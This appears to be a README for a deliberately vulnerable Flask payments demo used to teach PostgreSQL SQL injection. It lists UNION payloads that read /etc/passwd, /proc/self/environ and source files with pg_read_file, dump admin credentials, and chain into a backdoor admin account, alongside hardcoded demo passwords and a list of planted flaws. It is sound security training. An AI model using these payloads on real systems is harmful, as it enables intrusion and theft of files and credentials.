# 🐘 PostgreSQL Migration Complete!

The Typo Payments demo application has been successfully migrated from **SQLite** to **PostgreSQL**, unlocking advanced SQL injection capabilities including **file reading**!

## 🎯 What Changed

### Database Migration
- **Old**: SQLite (embedded database, limited features)
- **New**: PostgreSQL 15 (enterprise database, advanced exploitation capabilities)

### Key New Features
1. ✅ **File Reading via SQL Injection** - Use `pg_read_file()` to read system files
2. ✅ **Information Schema** - Professional database enumeration
3. ✅ **Boolean Types** - TRUE/FALSE instead of INTEGER 0/1
4. ✅ **Type Casting** - Use `::text`, `::int` for conversions
5. ✅ **Advanced Functions** - `version()`, `current_user`, `pg_sleep()`, etc.
6. ✅ **Better Error Messages** - Helpful for demonstration and learning

## 🚀 Quick Start

### Start the Application
```bash
docker compose up --build -d
```

### Access the Application
- **Web App**: http://localhost:5000
- **PostgreSQL**: localhost:5432

### Demo Accounts
- **Regular User**: `alice` / `password123`
- **Regular User**: `bob` / `password123`
- **Administrator**: `admin` / `admin123`

## 💻 Database Connection

The application now connects to PostgreSQL using environment variables:

```python
DB_HOST=postgres        # Docker service name (or localhost for local dev)
DB_PORT=5432           # PostgreSQL default port
DB_NAME=typo_payments  # Database name
DB_USER=typo_admin     # Database user
DB_PASSWORD=insecure_password_123  # Demo password
```

## 🔥 New SQL Injection Capabilities

### File Reading (⭐ NEW!)
```
# Read /etc/passwd
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/etc/passwd'), 5, 6, 7

# Read application files
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/app/requirements.txt'), 5, 6, 7

# Read environment variables
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/proc/self/environ'), 5, 6, 7
```

### Database Version
```
?id=1 UNION SELECT 1, version(), 3, 4, 5, 6, 7
```

### Table Enumeration (information_schema)
```
?id=1 UNION SELECT 1, table_name, 3, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema='public'
```

### Column Enumeration
```
?id=1 UNION SELECT 1, column_name, 3, data_type, 5, 6, 7 FROM information_schema.columns WHERE table_name='users'
```

### Extract User Credentials
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin::text, created_at::text FROM users WHERE is_admin=TRUE
```

## 📚 Documentation

### New Documentation Files
1. **`docs/POSTGRES_SQLI_PAYLOADS.md`** - Complete PostgreSQL injection guide
2. **`.env.example`** - Environment variable template
3. **`init_db.sql`** - PostgreSQL database initialization script

### Updated Files
- **`app.py`** - Migrated from sqlite3 to psycopg2
- **`requirements.txt`** - Added psycopg2-binary==2.9.9
- **`docker-compose.yml`** - Added PostgreSQL service with healthcheck
- **`Dockerfile`** - (no changes needed, requirements.txt handles it)

## 🎓 Key Differences: SQLite vs PostgreSQL

| Feature | SQLite | PostgreSQL |
|---------|---------|------------|
| **Placeholder** | `?` | `%s` |
| **Boolean Type** | INTEGER (0/1) | BOOLEAN (TRUE/FALSE) |
| **File Reading** | ❌ Not possible | ✅ `pg_read_file()` |
| **Schema View** | `sqlite_master` | `information_schema` |
| **Version Function** | `sqlite_version()` | `version()` |
| **Type Casting** | Limited | `::text`, `::int`, etc. |
| **Comments** | `--` (flexible) | `--` (needs space after) |

## 🛠️ Code Changes Summary

### Database Connection
```python
# OLD (SQLite)
conn = sqlite3.connect("typo_payments.db")
conn.row_factory = sqlite3.Row

# NEW (PostgreSQL)
conn = psycopg2.connect(
    host=os.environ.get("DB_HOST", "localhost"),
    port=os.environ.get("DB_PORT", "5432"),
    database=os.environ.get("DB_NAME", "typo_payments"),
    user=os.environ.get("DB_USER", "typo_admin"),
    password=os.environ.get("DB_PASSWORD", "insecure_password_123"),
)
```

### Query Execution
```python
# OLD (SQLite)
user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()

# NEW (PostgreSQL)
cursor = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
user = cursor.fetchone()
cursor.close()
```

### Boolean Handling
```python
# OLD (SQLite)
is_admin = 1 if request.form.get("is_admin") else 0
query = "SELECT COUNT(*) FROM users WHERE is_admin = 1"

# NEW (PostgreSQL)
is_admin = True if request.form.get("is_admin") else False
query = "SELECT COUNT(*) FROM users WHERE is_admin = TRUE"
```

### Type Casting in Queries
```python
# PostgreSQL requires explicit casting for non-text types
cursor.execute(
    "SELECT id, username, is_admin::text, created_at::text FROM users"
)
```

## 🔧 Development Workflow

### Local Development (without Docker)
1. Install PostgreSQL locally
2. Create database: `createdb typo_payments`
3. Run init script: `psql typo_payments < init_db.sql`
4. Set environment variables:
   ```bash
   export DB_HOST=localhost
   export DB_PORT=5432
   export DB_NAME=typo_payments
   export DB_USER=typo_admin
   export DB_PASSWORD=insecure_password_123
   ```
5. Run Flask: `python app.py`

### Docker Development
```bash
# Start everything
docker compose up --build -d

# View logs
docker logs -f typo-payments-demo

# Stop everything
docker compose down

# Reset database
docker compose down -v  # Removes volumes too
docker compose up --build -d
```

### Connect to PostgreSQL Database
```bash
# Via Docker
docker exec -it typo-postgres psql -U typo_admin -d typo_payments

# Locally (if PostgreSQL client installed)
psql -h localhost -p 5432 -U typo_admin -d typo_payments
# Password: insecure_password_123
```

## 🎬 Demo Scenarios

### Scenario 1: Basic File Reading
1. Login as Alice
2. Navigate to Status page
3. Try payload: `?id=1 UNION SELECT 1, 2, 3, pg_read_file('/etc/passwd'), 5, 6, 7`
4. **Result**: System users visible

### Scenario 2: Application Source Code Extraction
1. Login as any user
2. Navigate to Status page
3. Try payload: `?id=1 UNION SELECT 1, 2, 3, pg_read_file('/app/app.py'), 5, 6, 7`
4. **Result**: Full application source code revealed
5. **Explain**: Attacker can now find more vulnerabilities

### Scenario 3: Database Credential Theft → Privilege Escalation
1. Extract admin credentials:
   ```
   ?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin::text, created_at::text FROM users WHERE is_admin=TRUE
   ```
2. Note the admin username and password hash
3. Logout and login as admin (password: `admin123`)
4. Access admin panel at `/admin`
5. Create backdoor admin account
6. **Demonstrate complete system compromise**

### Scenario 4: Environment Variable Extraction
1. Try to read environment: `?id=1 UNION SELECT 1, 2, 3, pg_read_file('/proc/self/environ'), 5, 6, 7`
2. **Result**: Database credentials, secrets exposed
3. **Explain**: This is why environment security matters

## 📊 Database Schema

### Users Table
```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(80) UNIQUE NOT NULL,
    email VARCHAR(120) UNIQUE NOT NULL,
    password_hash VARCHAR(200) NOT NULL,
    full_name VARCHAR(120),
    is_admin BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### Payments Table
```sql
CREATE TABLE payments (
    id SERIAL PRIMARY KEY,
    user_id INTEGER NOT NULL REFERENCES users(id),
    recipient VARCHAR(120) NOT NULL,
    amount DECIMAL(10, 2) NOT NULL,
    description TEXT,
    status VARCHAR(20) DEFAULT 'completed',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### Feedback Table
```sql
CREATE TABLE feedback (
    id SERIAL PRIMARY KEY,
    user_id INTEGER NOT NULL REFERENCES users(id),
    username VARCHAR(80) NOT NULL,
    message TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## ⚠️ Security Notes (For Demo Use Only!)

This application is **intentionally vulnerable** for educational purposes:

❌ **SQL Injection** - Status page uses string formatting  
❌ **Reflected XSS** - Search page doesn't sanitize input  
❌ **Stored XSS** - Feedback stored and displayed without escaping  
❌ **Session Cookies** - HttpOnly flag disabled  
❌ **Weak Passwords** - Demo accounts have simple passwords  
❌ **Error Disclosure** - SQL errors shown to users  
❌ **No CSRF Protection** - Forms don't use CSRF tokens  
❌ **Database Privileges** - App user has excessive permissions  

**NEVER** deploy this to production!

## 🎯 Learning Objectives

After completing this demo, students will understand:
1. ✅ How SQL injection works in PostgreSQL
2. ✅ Difference between SQLite and PostgreSQL exploitation
3. ✅ How to read files via SQL injection
4. ✅ Using `information_schema` for enumeration
5. ✅ Why parameterized queries are essential
6. ✅ Impact of database choice on security
7. ✅ How to chain multiple vulnerabilities
8. ✅ Real-world attack scenarios and business impact

## 📖 Additional Resources

- **Main Documentation**: `docs/POSTGRES_SQLI_PAYLOADS.md`
- **Original SQLite Payloads**: `docs/SQLI_PAYLOADS.md` (kept for comparison)
- **VS Code Debugging**: `docs/DEBUGGING.md`
- **All Documentation**: `docs/` directory

## 🐛 Troubleshooting

### Port 5432 Already in Use
```bash
# Find and kill process using port 5432
lsof -ti:5432 | xargs kill -9

# Or use a different port in docker-compose.yml
ports:
  - "5433:5432"  # Map to 5433 on host
```

### Database Not Initializing
```bash
# Remove volumes and rebuild
docker compose down -v
docker compose up --build -d
```

### Connection Refused
```bash
# Check if PostgreSQL is healthy
docker compose ps

# View PostgreSQL logs
docker logs typo-postgres

# Wait for healthcheck to pass (5-10 seconds)
```

### psycopg2 Import Error (Local Development)
```bash
# Install PostgreSQL development headers
# macOS:
brew install postgresql

# Then install psycopg2-binary
pip install psycopg2-binary
```

## 🎉 Success!

You now have a **PostgreSQL-powered** vulnerable web application with:
- ✅ File reading capabilities via SQL injection
- ✅ Advanced database enumeration
- ✅ Realistic payment data (23 transactions)
- ✅ Admin privilege system
- ✅ Reflected and Stored XSS
- ✅ Multiple attack chain opportunities
- ✅ Comprehensive documentation

**Ready to demonstrate advanced SQL injection techniques!** 🚀

---

**Last Updated**: November 2025  
**PostgreSQL Version**: 15-alpine  
**Python**: 3.11  
**Flask**: 3.0.0  
**psycopg2-binary**: 2.9.9
